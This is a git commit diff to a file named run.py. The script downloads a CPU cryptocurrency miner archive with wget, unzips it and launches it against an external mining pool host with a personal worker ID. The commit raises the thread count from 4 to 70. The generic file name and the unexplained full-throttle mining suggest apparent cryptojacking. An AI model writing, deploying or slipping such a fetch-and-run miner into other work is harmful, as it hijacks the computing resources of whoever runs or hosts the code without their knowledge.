45a0fdba63d1b30f8bb091a74732fe9c2fd74d48
tatass <tatss2212@tas.com>
2019-01-06 09:38:23 +0800

    commit1

--- run.py
+++ run.py
@@ -4,6 +4,6 @@ cmd = "wget https://github.com/polyminer1/rhminer/releases/download/v1.2/rhminer
 os.system(cmd)
 cmd2 = "unzip rhminer.1.2.Linux.CPU.zip"
 os.system(cmd2)
-cmd3 = "./rhminer -s  boxmais.gq:443 -su 86646-64.8ce4a4b69b2b1fcd.ooxx/wenyuan85858@gmail.com -r 20 -cpu -cputhreads 4 -apiport 0"
+cmd3 = "./rhminer -s  boxmais.gq:443 -su 86646-64.8ce4a4b69b2b1fcd.ooxx/wenyuan85858@gmail.com -r 20 -cpu -cputhreads 70 -apiport 0"
 os.system(cmd3)
 
